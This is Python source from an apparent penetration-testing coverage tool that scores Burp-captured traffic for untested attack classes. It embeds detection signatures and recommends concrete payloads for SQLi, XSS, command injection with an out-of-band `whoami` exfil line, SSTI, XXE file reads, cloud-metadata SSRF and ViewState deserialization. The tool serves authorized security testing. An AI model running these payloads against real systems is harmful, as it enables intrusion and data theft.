# RETEST-DETECTION HELPERS
# These detect EVIDENCE that the user already performed a given
# class of test, so the corresponding "X not tested" gap can be
# suppressed on re-runs. This is what makes the score reduce when
# the user adds more test cases and re-runs CoverMap.
# ─────────────────────────────────────────────────────────────────

_LOGIN_FIELD_RE = re.compile(r'(user|email|login|signin|signon|account|uid|userid|loginid|cred)', re.I)
_PWD_FIELD_RE   = re.compile(r'(pass|pwd|secret|passwd)', re.I)
_OTP_FIELD_RE   = re.compile(r'(otp|code|2fa|mfa|verif|challenge|totp)', re.I)
_RESET_FIELD_RE = re.compile(r'(token|reset|code|nonce|key)', re.I)
_PRIV_KEY_RE    = re.compile(
    r'\b(is_?admin|admin|role|roles|verified|approved|active|enabled|'
    r'balance|credit|permission|grant|tier|plan|status|account_?type|user_?type|level)\b', re.I)

SQLI_AUTH_SIGS = ("'", '"', '--', '/*', '#', 'or 1=1', 'or 1=2', 'and 1=1', "or '1'='1",
                  "' or '", "' and '", '" or "', 'union select', 'union all', 'sleep(',
                  'pg_sleep', 'benchmark(', 'waitfor delay', "admin'--", "admin'#", "')", '" or 1')
NOSQL_AUTH_SIGS = ('$ne', '$gt', '$lt', '$gte', '$regex', '$where', '$in', '"$ne"', '[$ne]', '[$gt]', '||1==1')
LDAP_AUTH_SIGS = ('*)(', '*)', '|(uid=', '|(cn=', 'admin)(&', '&(uid=', ')(|(', '*))%00', '*)(uid=*')

STRUCT_EMPTY = ('',)
STRUCT_NULL = ('null', 'none', '"null"', "'null'")
STRUCT_BOOL = ('true', 'false', '"true"', '"false"')
STRUCT_TYPECONFUSION = ('[]', '{}', '["a","b"]', '{"$ne":null}')


def _values_for(all_params, name_regex):
    """Collect every tested value for params whose normalised name matches name_regex."""
    out = []
    for k, vals in all_params.items():
        if _u(k).strip().lower() in FRAMEWORK_PARAMS:
            continue
        if name_regex.search(_norm_param(k)):
            out.extend(list(vals))
    return [_u(v).lower() for v in out]


def _detect_removed_params(p):
    """Param names omitted in at least one relevant request - evidence the
    pentester removed/dropped the field during a retest.

    Body params are compared only against requests that submitted a body
    (so a GET page-load doesn't look like 'every field was removed'); query
    params against query-bearing requests. Framework plumbing is ignored.
    Requires >=2 comparable requests so a single capture isn't misread."""
    removed = set()
    if p.body_submit_count >= 2:
        for param, cnt in p.body_param_presence.items():
            if _u(param).strip().lower() in FRAMEWORK_PARAMS:
                continue
            if cnt < p.body_submit_count:
                removed.add(param)
    if p.query_bearing_count >= 2:
        for param, cnt in p.query_param_presence.items():
            if _u(param).strip().lower() in FRAMEWORK_PARAMS:
                continue
            if cnt < p.query_bearing_count:
                removed.add(param)
    return removed


def _structural_signals(p, name_regex=None):
    """Structural test categories with observed evidence on this endpoint,
    optionally restricted to params whose normalised name matches name_regex.
    Categories: 'removed', 'empty', 'hpp', 'array'."""
    sig = set()
    def _match(k):
        if name_regex is None:
            return _u(k).strip().lower() not in FRAMEWORK_PARAMS
        return bool(name_regex.search(_norm_param(k)))

    removed = _detect_removed_params(p)
    if any(_match(k) for k in removed):
        sig.add('removed')
    if any(_match(k) for k in p.empty_value_params):
        sig.add('empty')
    if any(_match(k) for k in p.hpp_params):
        sig.add('hpp')
    if any(_match(k) for k in p.array_params):
        sig.add('array')
    return sig


def _detect_auth_testing(p, all_params):
    """Categories of testing observed on a login/reset/register/otp endpoint."""
    tested = set()

    user_vals = _values_for(all_params, _LOGIN_FIELD_RE)
    pwd_vals  = _values_for(all_params, _PWD_FIELD_RE)
    otp_vals  = _values_for(all_params, _OTP_FIELD_RE)
    rst_vals  = _values_for(all_params, _RESET_FIELD_RE)
    combined  = user_vals + pwd_vals + otp_vals + rst_vals
    if not combined:
        # No obvious named fields - fall back to all non-framework param values
        for k, vals in all_params.items():
            if _u(k).strip().lower() in FRAMEWORK_PARAMS:
                continue
            combined.extend(_u(v).lower() for v in vals)

    if any(s in v for s in SQLI_AUTH_SIGS for v in combined):
        tested.add('sqli')
    if any(s in v for s in NOSQL_AUTH_SIGS for v in combined):
        tested.add('nosql')
    if any(s in v for s in LDAP_AUTH_SIGS for v in combined):
        tested.add('ldap')
    if any(v == '' for v in combined):
        tested.add('empty')
    if any(v in STRUCT_NULL for v in combined):
        tested.add('null')
    if any(v in STRUCT_BOOL for v in combined):
        tested.add('bool')
    if any(v in STRUCT_TYPECONFUSION for v in combined):
        tested.add('typeconfusion')
    if p.total_requests >= 20:
        tested.add('brute_volume')
    # Per-field fuzzing signal: 4+ distinct values on any candidate field
    for k, vals in all_params.items():
        if _u(k).strip().lower() in FRAMEWORK_PARAMS:
            continue
        nm = _norm_param(k)
        if (_LOGIN_FIELD_RE.search(nm) or _PWD_FIELD_RE.search(nm) or
                _OTP_FIELD_RE.search(nm) or _RESET_FIELD_RE.search(nm)):
            if len(set(vals)) >= 4:
                tested.add('field_fuzzed')
                break

    # ── Structural tests (field removal / empty / HPP / array) on auth fields ──
    # This is what credits "I removed the password field on retest". The
    # combined regex covers username/email/uid + password + otp/code + token.
    auth_field_re = re.compile(
        r'(user|email|login|signin|signon|account|uid|userid|cred|'
        r'pass|pwd|secret|otp|code|2fa|mfa|verif|challenge|totp|token|reset|nonce)', re.I)
    struct = _structural_signals(p, auth_field_re)
    if 'removed' in struct:
        tested.add('removed')
    if 'empty' in struct:
        tested.add('empty')
    if 'hpp' in struct or 'array' in struct:
        tested.add('typeconfusion')   # duplicate-key / array bind is a type/structure test
    return tested


def _detect_mass_assign_tested(p):
    """Did the user inject privilege/state keys into the body?"""
    for k in p.body_params:
        if _u(k).strip().lower() in FRAMEWORK_PARAMS:
            continue
        if _PRIV_KEY_RE.search(_norm_param(k)):
            return True
    return False


def _detect_header_spoofing_tested(p):
    return bool(p.headers_modified & set([
        'x-forwarded-for', 'x-forwarded-host', 'x-real-ip',
        'x-original-url', 'x-rewrite-url', 'x-custom-ip-authorization',
    ]))


def _detect_method_override_tested(p):
    return bool(p.headers_modified & set([
        'x-http-method-override', 'x-original-url', 'x-rewrite-url',
    ]))


def _detect_cors_tested(p):
    # If Origin header was modified across multiple requests, treat as tested.
    return 'origin' in p.headers_modified


# Burp Scanner audits an endpoint with dozens-to-hundreds of requests across all
# active-audit issue types. A handful of Scanner requests against an endpoint is
# definitive evidence it was actively audited. Intruder needs a higher bar since
# its payload set is whatever the user loaded.
SCANNER_AUDIT_MIN = 5
INTRUDER_AUDIT_MIN = 20

# Attack classes Burp Scanner's active audit genuinely covers - credited when an
# endpoint was scanner-audited. Manual/logic classes (auth bypass, business
# logic, mass assignment, response tampering) are deliberately NOT in this set.
SCANNER_COVERED_CLASSES = set([
    'SQLi', 'NoSQL', 'XSS', 'SSTI', 'CmdInj', 'Traversal/LFI',
    'SSRF', 'OpenRedirect', 'CRLF/Header',
])


def _scanner_audited(p):
    """True if Burp Scanner (or heavy Intruder fuzzing) actively audited this
    endpoint. Used to credit the automated injection classes so a full Burp
    scan is recognised instead of being reported as 'not tested'."""
    return p.scanner_hits >= SCANNER_AUDIT_MIN or p.intruder_hits >= INTRUDER_AUDIT_MIN


def _is_nonexistent_endpoint(p):
    """True if the endpoint never returned real content - only 404s (and/or 0 =
    no/failed response). These are crawler/scanner probes for paths that don't
    exist on this app (e.g. /api/graphql or /actuator on an ASP.NET/.aspx or PHP
    site). Treating them as real endpoints produces a flood of false-positive
    'not tested' gaps, so they are dropped before analysis.

    Conservative by design: an endpoint is dropped ONLY when 404 is observed AND
    no non-404, non-zero status ever was. So `/api/users/{id}` that returned 200
    once and 404 once is KEPT; a path that only ever 404'd is dropped. 401/403
    (protected-but-real) and 3xx (redirects) are never treated as non-existent."""
    statuses = set(s for s in p.status_codes_seen if isinstance(s, int))
    real = statuses - set([0, 404])
    return (404 in statuses) and (len(real) == 0)


# ─────────────────────────────────────────────────────────────────
# RESPONSE-DRIVEN & CROSS-IDENTITY EVIDENCE
# These read captured RESPONSES (not just request payloads), turning
# coverage GAPS into concrete FINDINGS where the evidence supports it.
# ─────────────────────────────────────────────────────────────────

def _cross_identity_idor(p):
    """Correlate object ids across identities.

    Returns (tested, crit_evidence):
      tested        - True if the SAME id-like value was requested under >=2
                      distinct identities (IDOR is then EVIDENCE-tested, not a
                      blind gap).
      crit_evidence - dict when one identity successfully fetched (HTTP 200 +
                      non-trivial body) an id that ANOTHER identity also used,
                      i.e. a likely confirmed BOLA. None otherwise."""
    # value -> set(identities that used it); value -> identity that fetched 200+body
    value_identities = defaultdict(set)
    value_success = {}
    for ident, objmap in p.identity_object_access.items():
        for val, (st, ln) in objmap.items():
            value_identities[val].add(ident)
            if st == 200 and ln > 64:
                value_success.setdefault(val, set()).add(ident)

    tested = any(len(idents) >= 2 for idents in value_identities.values())

    crit = None
    for val, idents in value_identities.items():
        if len(idents) < 2:
            continue
        succ = value_success.get(val, set())
        # A confirmed cross-identity fetch: at least one identity got a real 200
        # body for an id that >=2 identities referenced.
        if succ:
            crit = {
                'value': val,
                'identities': len(idents),
                'fetched_by': len(succ),
            }
            break
    return tested, crit


def _response_blob(p, limit=4):
    """Concatenated (lowercased-safe) response bodies, bounded, for scanning."""
    parts = []
    for s in p.response_samples[:limit]:
        b = s.get('body') or ''
        if b:
            parts.append(_u(b))
    return "\n".join(parts)


def _response_content_findings(p):
    """Findings derived from RESPONSE bodies: server-side error/stack fingerprints
    (-> injection finding) and sensitive-data leakage (-> A02 finding). Returns a
    list of (severity, title, detail, evidence, recommendation, owasp)."""
    out = []
    blob = _response_blob(p, limit=MAX_RESP_SAMPLES)
    if not blob:
        return out

    m = SQL_ERROR_RE.search(blob)
    if m:
        out.append(('CRITICAL', 'SQL error string returned in response',
                    'A database error/exception leaked into a response body - strong evidence the input '
                    'reaches a SQL sink unsanitised (error-based SQLi likely).',
                    'matched: {0}'.format(_trunc(m.group(0), 60)),
                    'Confirm with boolean/UNION/error-based payloads; enumerate via the leaked DBMS error format. '
                    'This is a FINDING, not a coverage gap.',
                    'A03:2021 Injection'))
    m = STACK_TRACE_RE.search(blob)
    if m:
        out.append(('HIGH', 'Stack trace / framework error leaked in response',
                    'An unhandled exception/stack trace reached the client - leaks framework, file paths and '
                    'code structure, and signals missing error handling around a sink.',
                    'matched: {0}'.format(_trunc(m.group(0), 60)),
                    'Map the disclosed stack; many injection/deserialization bugs surface here first. '
                    'Report verbose errors (A05) and pursue the underlying sink.',
                    'A05:2021 Security Misconfiguration'))
    if JWT_RE.search(blob):
        out.append(('HIGH', 'JWT present in response body',
                    'A JSON Web Token was returned in a response body (not just a header/cookie) - check whether '
                    'it leaks another user\'s token or carries sensitive claims.',
                    'JWT pattern matched in response body',
                    'Decode the JWT; verify it is the caller\'s own token, scope/claims are minimal, and it is not '
                    'reflected from another identity. Test alg confusion / weak-secret separately.',
                    'A02:2021 Cryptographic Failures'))
    m = APIKEY_RE.search(blob)
    if m:
        out.append(('CRITICAL', 'API key / secret material in response body',
                    'High-entropy credential (cloud key / API token / private key) returned to the client.',
                    'matched: {0}'.format(_trunc(m.group(0), 24)),
                    'Validate the key is live and scoped; this is a direct secret-exposure FINDING. Rotate + report.',
                    'A02:2021 Cryptographic Failures'))
    if PII_RE.search(blob):
        out.append(('HIGH', 'PII (SSN / card-number pattern) in response body',
                    'A response body contained a value matching an SSN or payment-card number pattern.',
                    'PII pattern matched in response body',
                    'Confirm it is real PII (not a test fixture) and that the caller is authorised to see it; '
                    'check for over-broad object responses (BOLA / excessive data exposure).',
                    'A02:2021 Cryptographic Failures'))
    return out


def _response_header_findings(p, fn):
    """Misconfiguration findings read from captured RESPONSE headers / Set-Cookie:
    reflective CORS, missing/weak CSP, insecure cookies, missing HSTS on auth."""
    out = []
    rh = p.response_headers_seen
    if not rh and not p.set_cookies_seen:
        return out

    def vals(name):
        return rh.get(name, set())

    acao = vals('access-control-allow-origin')
    acac = vals('access-control-allow-credentials')
    if acao:
        acac_true = any('true' in _u(v).lower() for v in acac)
        reflects = any(_u(v).strip() not in ('', '*') for v in acao)
        if '*' in set(_u(v).strip() for v in acao) and acac_true:
            out.append(('HIGH', 'CORS: wildcard ACAO with credentials',
                        'Access-Control-Allow-Origin: * together with Allow-Credentials: true is invalid-but-dangerous '
                        'and, where honoured, exposes authenticated responses cross-site.',
                        'ACAO={0}; ACAC=true'.format(_join_clean(acao, limit=3)),
                        'Confirm the browser honours it; restrict ACAO to a vetted allowlist and drop credentials for *.',
                        'A05:2021 Security Misconfiguration'))
        elif reflects and acac_true:
            out.append(('HIGH', 'CORS: origin-reflected ACAO with credentials',
                        'The server reflects an Origin into Access-Control-Allow-Origin while allowing credentials - '
                        'an attacker-controlled origin can read authenticated responses.',
                        'ACAO={0}; ACAC=true'.format(_join_clean(acao, limit=3)),
                        'Re-send with Origin: https://evil.com and Origin: null; if reflected with ACAC:true it is exploitable.',
                        'A05:2021 Security Misconfiguration'))

    # Missing/weak CSP on an HTML response.
    is_html = any(HTML_CT_RE.search(_u(v)) for v in vals('content-type'))
    if is_html and not vals('content-security-policy'):
        out.append(('MEDIUM', 'Missing Content-Security-Policy on HTML response',
                    'No CSP header on an HTML response - removes a key defence-in-depth control against XSS/injection.',
                    'content-type indicates HTML; no CSP header observed',
                    'Add a restrictive CSP; absence raises the impact of any reflected/stored XSS on this surface.',
                    'A05:2021 Security Misconfiguration'))

    # Insecure Set-Cookie flags.
    for ck in p.set_cookies_seen[:20]:
        low = ck.lower()
        name = ck.split('=', 1)[0].strip()
        missing = []
        if 'httponly' not in low:
            missing.append('HttpOnly')
        if 'secure' not in low:
            missing.append('Secure')
        if 'samesite' not in low:
            missing.append('SameSite')
        if missing:
            out.append(('MEDIUM', 'Set-Cookie `{0}` missing: {1}'.format(name, ", ".join(missing)),
                        'A cookie was set without {0}. Missing HttpOnly aids XSS cookie theft; missing Secure allows '
                        'plaintext leakage; missing SameSite enables CSRF.'.format(", ".join(missing)),
                        _trunc(ck, 80),
                        'Set HttpOnly, Secure and SameSite=Lax/Strict on session cookies.',
                        'A05:2021 Security Misconfiguration'))
            break    # one representative cookie finding is enough per endpoint

    # Missing HSTS on an auth-class endpoint.
    if 'auth' in fn and not vals('strict-transport-security'):
        out.append(('MEDIUM', 'Missing HSTS on authentication endpoint',
                    'No Strict-Transport-Security header on an auth endpoint - permits SSL-strip / downgrade against '
                    'credential traffic.',
                    'no strict-transport-security header observed',
                    'Add HSTS (long max-age, includeSubDomains, preload) on all auth/HTTPS surfaces.',
                    'A05:2021 Security Misconfiguration'))
    return out


def _prior_step_hint(p):
    """Name a concrete prior step for the workflow-bypass recommendation using the
    reconstructed per-identity request order, instead of generic 'the prior step'."""
    if not p.request_timeline:
        return ''
    # Sort by timestamp string (ISO-ish sorts correctly); fall back to capture order.
    try:
        ordered = sorted(p.request_timeline, key=lambda t: t[0])
    except Exception:
        ordered = list(p.request_timeline)
    paths = []
    for _ts, method, _ident, pq in ordered:
        label = "{0} {1}".format(method, pq.split('?')[0])
        if label not in paths:
            paths.append(label)
    if len(paths) < 2:
        return ''
    return paths[-2]    # the step immediately before this endpoint's own request


def _heuristics(p):
    gaps = []
    credits = [0]   # count of test-classes proven exercised (drives the score up on retest)
    all_params = {}
    all_params.update(p.query_params)
    all_params.update(p.body_params)
    q_names = set(p.query_params)
    ep = "{0}{1}".format(p.host, p.path)
    sens = bool(SENSITIVE_PATH.search(p.path))
    fn = _infer_fn(p.path)
    state_changing = bool(p.methods_seen & set(['POST', 'PUT', 'DELETE', 'PATCH']))

    # Pre-login / unauthenticated-by-design endpoints. Access-control gaps like
    # "never tested without Authorization/Cookie" or "single identity - IDOR
    # untested" do not apply here because these endpoints are INTENDED to be
    # reachable anonymously. We still run the brute-force, auth-bypass payload,
    # structural-tampering, reset-flow, OTP, and response-flip checks below.
    is_prelogin = bool(fn & set(['auth', 'reset', 'register', 'otp']))

    # Did Burp Scanner / heavy Intruder actively audit this endpoint? If so, the
    # automated injection classes are credited even when individual payloads are
    # not captured in the export, so a full scan isn't reported as 'not tested'.
    scanner_audited = _scanner_audited(p)

    def g(cat, sev, title, detail, evidence, rec, owasp='', kind='test', tier=''):
        gaps.append(Gap(ep, cat, sev, title, detail, evidence, rec, owasp, kind, tier))

    def credit(n=1, confidence=1.0):
        # `confidence` lets weak evidence (a single payload on a single value)
        # credit a class only partially, so it cannot fully mark the whole
        # attack class "tested" for the endpoint.
        credits[0] += n * confidence

    # Cross-identity object-access correlation (computed once; reused below).
    xident_tested, xident_crit = _cross_identity_idor(p)

    # A01: BROKEN ACCESS CONTROL - skipped for pre-login forms (they are
    # unauthenticated by design; flagging "no anonymous test" on a login page
    # is a false positive).
    if not is_prelogin:
        if p.requests_with_auth > 0 and p.requests_without_auth == 0:
            g('auth', 'CRITICAL' if sens else 'HIGH',
              'Never tested without Authorization/Cookie',
              'All requests authenticated. Unauthenticated access never attempted.',
              '{0} requests, all authenticated'.format(p.requests_with_auth),
              'Strip Cookie/Authorization. Confirm 401/302, not 200+data. Also try expired/garbage token.',
              'A01:2021 Broken Access Control', 'coverage')

        # IDOR/BOLA. Cross-identity correlation upgrades this from a guess to
        # evidence: if the SAME id value was requested under >=2 identities the
        # access-control test was actually performed (credit + suppress gap); if
        # one identity then fetched a real 200 body for an id another identity
        # also used, emit a CONFIRMED finding.
        if xident_crit:
            g('auth', 'CRITICAL',
              'Cross-identity object access CONFIRMED (likely IDOR/BOLA)',
              'An id-like value was requested under {0} distinct identities and at least one identity received a '
              'HTTP 200 with a non-trivial body for it - strong evidence of horizontal/vertical object-access '
              'control failure.'.format(xident_crit['identities']),
              'shared id value `{0}` used by {1} identities; fetched 200+body by {2}'.format(
                  _trunc(xident_crit['value'], 40), xident_crit['identities'], xident_crit['fetched_by']),
              'Diff the two identities\' responses for the same id; confirm userB reads userA\'s object. '
              'Then sweep adjacent ids to size the blast radius. This is a FINDING, not a coverage gap.',
              'A01:2021 Broken Access Control', 'finding', 'evidence')
            credit()
        elif xident_tested:
            # Same id seen under >=2 identities but no confirmed successful fetch:
            # the IDOR test WAS performed (e.g. returned 403), so credit it and do
            # not raise the blind "single identity" gap.
            credit()
        elif len(p.auth_tokens_seen) <= 1 and p.requests_with_auth > 1:
            g('auth', 'HIGH',
              'Single identity - horizontal/vertical IDOR untested',
              'Only one session/token observed. Cross-account and cross-role access not proven. '
              '(No id-like value was observed requested under two different identities.)',
              '{0} distinct token across {1} requests'.format(len(p.auth_tokens_seen), p.requests_with_auth),
              'Replay with userB cookie keeping userA object ids. Use low-priv token on this endpoint. '
              'Test cookie-swap, JWT sub/role edit, and no-token.',
              'A01:2021 Broken Access Control', 'coverage')

        if sens or 'admin' in fn:
            g('access', 'HIGH',
              'Function-level access control not proven',
              'Sensitive/admin function reached only with a privileged session.',
              'path={0}, methods={1}'.format(p.path, sorted(p.methods_seen)),
              'Forced-browse with low-priv & anonymous sessions. Test direct POST to the action handler '
              '(skip the UI gate). Tamper UI-only flags. Check sibling pages (UserList/UserRegistration/etc.).',
              'A01:2021 Broken Access Control')

    if not _detect_method_override_tested(p):
        g('access', 'MEDIUM',
          'HTTP method / verb-tampering bypass not tested',
          'Access control may key on method; override headers may bypass it. '
          '(Heuristic: no method-override header (X-HTTP-Method-Override / X-Original-URL / '
          'X-Rewrite-URL) observed in captured traffic.)',
          'methods seen: {0}'.format(sorted(p.methods_seen)),
          'Try X-HTTP-Method-Override: GET/PUT, X-Original-URL, X-Rewrite-URL, lowercase/unknown verbs, '
          'and trailing path tricks (/admin/..;/, %2e, //, .json).',
          'A01:2021 Broken Access Control')
    else:
        credit()

    # A02: SENSITIVE DATA EXPOSURE
    leaky = [k for k in q_names if SENSITIVE_IN_URL.search(_norm_param(k))]
    if leaky:
        g('crypto', 'MEDIUM',
          'Sensitive value(s) in URL query: {0}'.format(", ".join(leaky)),
          'Secrets in the query string leak via logs, Referer, proxy and browser history.',
          'query params: {0}'.format(_join_clean(leaky)),
          'Move to POST body/headers. Check server access logs, Referer leakage to 3rd parties, caching.',
          'A02:2021 Cryptographic Failures')

    # A03: INJECTION + per-param coverage
    removed_params = _detect_removed_params(p)   # computed once for the whole endpoint
    for param, values in all_params.items():
        if _u(param).strip().lower() in FRAMEWORK_PARAMS:
            continue
        vals = list(values)
        ev = "{0}={1}".format(_u(param), _join_clean(vals, limit=3))
        np = _norm_param(param)
        # Per-param structural evidence (field removal / empty / HPP / array).
        param_struct = set()
        if param in removed_params:
            param_struct.add('removed')
        if param in p.empty_value_params:
            param_struct.add('empty')
        if param in p.hpp_params:
            param_struct.add('hpp')
        if param in p.array_params:
            param_struct.add('array')

        if (INJECTION_PARAM.search(np) or IDOR_PARAM.search(np)) and not scanner_audited:
            if not _has_sig(values, ("'", '"', '--', ';', '/*', 'or 1=1', 'union', 'sleep', 'waitfor', '`')):
                g('injection', 'HIGH', 'SQLi not tested on `{0}`'.format(param),
                  '`{0}` flows into a query. No SQLi payloads observed.'.format(param), ev,
                  "Error: `'` `\"` `')` ; Boolean: `' OR '1'='1'-- -` ; Time: `1' AND SLEEP(5)-- -`, "
                  "`1);WAITFOR DELAY '0:0:5'--` ; UNION: `' UNION SELECT NULL-- -` ; stacked. " + WAF_BYPASS,
                  'A03:2021 Injection')

        # Reflected-value detection (response-driven): if any tested value for
        # this param came back verbatim in a response body, reflection is PROVEN -
        # raise confidence to a finding and stop reporting a blind "XSS not tested".
        param_reflected = any(_u(v).strip()[:80] in p.reflected_values
                              for v in values if _u(v).strip())
        if XSS_PARAM.search(np) and param_reflected:
            g('injection', 'HIGH', 'Reflected input on `{0}` (response-confirmed)'.format(param),
              '`{0}` was echoed verbatim in a response body - reflection is confirmed, so XSS is plausible '
              'pending context/encoding analysis.'.format(param), ev,
              "Confirm the reflection context (HTML body / attribute / JS / URL) and test a context-matched "
              "breakout: `\"><svg onload=alert(1)>`, `\" autofocus onfocus=alert(1) x=\"`, `';alert(1)//`. "
              "Check output encoding and CSP. This is response-evidence, not a blind gap.",
              'A03:2021 Injection', 'finding', 'evidence')
            credit()
        elif XSS_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('<script', 'onerror', 'onload', 'javascript:', '<img', '<svg', 'alert(')):
            g('injection', 'HIGH', 'XSS not tested on `{0}`'.format(param),
              '`{0}` is reflected/stored candidate.'.format(param), ev,
              "Reflected: `\"><svg onload=alert(1)>` ; attribute break `\" autofocus onfocus=alert(1) x=\"` ; "
              "JS context `';alert(1)//` ; stored: submit then view render page; "
              "polyglot `jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//`. Check CSP.",
              'A03:2021 Injection')
        elif XSS_PARAM.search(np) and not scanner_audited:
            credit()    # an XSS payload signature was present -> class exercised

        if CMD_PARAM.search(np) and not scanner_audited and not _has_sig(values, (';', '|', '&&', '`', '$(', '%0a', 'sleep ', 'ping ')):
            g('injection', 'HIGH', 'OS command injection not tested on `{0}`'.format(param),
              '`{0}` name suggests a system/host/exec sink.'.format(param), ev,
              "Test `;id`, `| id`, `&& id`, `$(id)`, `` `id` ``, `%0aid`, blind: `;sleep 5`, "
              "OOB: `;nslookup $(whoami).collab`. Windows: `&whoami`, `|dir`.",
              'A03:2021 Injection')

        if (SSTI_PARAM.search(np) and not scanner_audited
                and not _has_sig(values, ('{{', '${', '#{', '<%=', '{%'))
                and not _benign_scalar_skip(param, values)):
            g('injection', 'HIGH', 'SSTI not tested on `{0}`'.format(param),
              '`{0}` may be rendered by a template engine.'.format(param), ev,
              "Probe `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`, `${{7*7}}`, `{{7*'7'}}`. "
              "If 49/7777777 -> engine-specific RCE (Jinja2/Twig/Freemarker/Velocity).",
              'A03:2021 Injection')

        if LDAP_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('*)(', '*)', '|(', '&(')):
            g('injection', 'MEDIUM', 'LDAP / XPath injection not tested on `{0}`'.format(param),
              '`{0}` may build an LDAP/XPath filter.'.format(param), ev,
              "LDAP: `*`, `*)(uid=*))(|(uid=*`, `admin)(&)` ; XPath: `' or '1'='1`, `'] | //user/*['`.",
              'A03:2021 Injection')

        if CRLF_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('%0d', '%0a', '\r', '\n')):
            g('injection', 'MEDIUM', 'CRLF / header injection not tested on `{0}`'.format(param),
              '`{0}` may reflect into a response header.'.format(param), ev,
              "Test `%0d%0aSet-Cookie:x=1`, `%0d%0aLocation:https://evil`, response-splitting -> XSS/cache.",
              'A03:2021 Injection')

        # A class counts as exercised if its payload signature appears in a
        # tested value, OR (Overflow/Type) structural evidence exists for this
        # param, OR Burp Scanner actively audited this endpoint and the class is
        # one the scanner covers. This is what makes a full Burp scan register as
        # coverage instead of false "not tested" gaps.
        untested = []
        for (cls, sigs, pl) in PARAM_ATTACK_MATRIX:
            strength = _sig_strength(values, sigs)
            if strength:
                # One payload on one value is weak evidence (0.5); >=2 distinct
                # payloads is a real fuzzing pass (1.0). Confidence keeps a lone
                # stray signature from fully crediting the class.
                credit(confidence=1.0 if strength >= 2 else 0.5)
                continue
            if cls == 'Overflow/Type' and param_struct:
                credit()
                continue
            if scanner_audited and cls in SCANNER_COVERED_CLASSES:
                credit()
                continue
            untested.append((cls, pl))
        if untested:
            classes = ", ".join(c for c, _pl in untested)
            payloads = "  ||  ".join("{0}: {1}".format(c, pl) for c, pl in untested)
            struct_note = ""
            if param_struct:
                struct_note = " Structural tests already seen: {0}.".format(", ".join(sorted(param_struct)))
            g('param', 'HIGH' if state_changing else 'MEDIUM',
              'Custom parameter `{0}` not fuzzed for: {1}'.format(param, classes),
              '`{0}` is a user-controllable input. No attack-class signatures seen in tested values, '
              'so these classes were never exercised on it.{1}'.format(param, struct_note),
              ev,
              'Fuzz `{0}` with each: {1}. '.format(param, payloads) + WAF_BYPASS,
              'A03:2021 Injection')

    # ViewState / XXE / deserialization
    has_viewstate = False
    for k in p.body_params:
        if 'viewstate' in _u(k).lower():
            has_viewstate = True
            break
    if has_viewstate:
        g('integrity', 'HIGH', 'ASP.NET __VIEWSTATE present - MAC & deserialization untested',
          'VIEWSTATE may be unencrypted/unsigned -> tampering, info-leak, or RCE (ViewState deserialization).',
          'body contains __VIEWSTATE',
          'Decode VIEWSTATE (Base64) for data leakage. Drop __EVENTVALIDATION / flip a byte: 200=MAC off (forgeable). '
          'If MAC off -> ysoserial.net ViewState gadget for RCE.',
          'A08:2021 Software & Data Integrity Failures')

    body_has_mass = False
    for k in p.body_params:
        if MASS_ASSIGN_HINT.search(_norm_param(k)):
            body_has_mass = True
            break
    if 'api' in fn or body_has_mass or state_changing:
        if not _detect_mass_assign_tested(p):
            g('integrity', 'HIGH', 'Mass assignment / parameter pollution not tested',
              'Write endpoint may bind unexpected fields (privilege/balance/state). '
              '(Heuristic: no privilege keys (role/is_admin/verified/balance/etc.) observed in submitted body.)',
              'body params: {0}'.format(_join_clean(p.body_params, limit=8)),
              'Add `role=admin`, `is_admin=true`, `verified=true`, `balance=999999`, `id=<other>` to the body. '
              'Try JSON & form; duplicate keys (HPP); array/object wrapping `user[role]=admin`.',
              'A08:2021 Software & Data Integrity Failures')
        else:
            credit()

    if ('api' in fn or 'graphql' not in fn) and not scanner_audited:
        g('injection', 'LOW', 'Content-type / body-format confusion not tested',
          'Endpoint may accept JSON/XML even if only form-encoded was used (or vice-versa).',
          'tested content-types only as captured',
          'Resend body as application/json, text/xml (XXE: `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>`), '
          'and multipart. XML accepted -> test XXE/SSRF/billion-laughs.',
          'A03:2021 Injection')

    # XXE: an XML body was actually observed -> the XXE surface is real, not
    # hypothetical. If a DOCTYPE/ENTITY was already present an XXE attempt was
    # likely made (credit); otherwise flag the untested XML surface.
    if p.xml_body_seen:
        xxe_attempted = ('__xml_doctype__' in p.body_params or '__xml_entity__' in p.body_params)
        if xxe_attempted:
            credit()
            g('injection', 'HIGH', 'XML body with DOCTYPE/ENTITY observed - confirm XXE',
              'An XML request body containing a DOCTYPE/ENTITY declaration was captured - an XXE attempt was '
              'likely made. Confirm whether external entities resolve.',
              'xml elements: {0}'.format(_join_clean(
                  [k for k in p.body_params if not k.startswith('__xml')], limit=8)),
              'Confirm file read (`file:///etc/passwd`), SSRF via entity (`http://169.254.169.254/...`), and '
              'billion-laughs DoS; test parameter entities + OOB exfiltration via external DTD.',
              'A05:2021 Security Misconfiguration')
        else:
            g('injection', 'HIGH', 'XML body accepted - XXE not tested',
              'This endpoint consumes XML, so the XXE attack surface is real. No DOCTYPE/ENTITY was observed in '
              'captured bodies, so XXE was not exercised.',
              'xml elements: {0}'.format(_join_clean(list(p.body_params), limit=8)),
              'Inject `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>&e;`; test SSRF entity, parameter '
              'entities, external-DTD OOB exfil, and billion-laughs. Also try XInclude if DOCTYPE is filtered.',
              'A05:2021 Security Misconfiguration')

    # A04/A08: BUSINESS LOGIC & RACE
    money = [k for k in all_params if PRICE_PARAM.search(_norm_param(k))]
    if money:
        g('logic', 'HIGH', 'Price/quantity tampering not tested: {0}'.format(", ".join(money[:5])),
          'Client-supplied financial fields enable under/over-charge & negative-balance abuse.',
          'params: {0}'.format(_join_clean(money, limit=5)),
          'Set negatives (qty=-1, amount=-100), 0, decimals (0.001), huge ints, currency swap, coupon stacking, '
          'and re-use one-time vouchers. Verify server recomputes server-side.',
          'A04:2021 Insecure Design')
        g('logic', 'HIGH', 'Structural tampering on price/quantity NOT tested: {0}'.format(", ".join(money[:5])),
          'Removing the price field entirely, sending empty/null, array-bound values and race-conditions '
          'on coupon/refund are distinct from value-range fuzzing and frequently bypass server validation.',
          'params: {0}'.format(_join_clean(money, limit=5)),
          STRUCTURAL_PRICE,
          'A04:2021 Insecure Design')

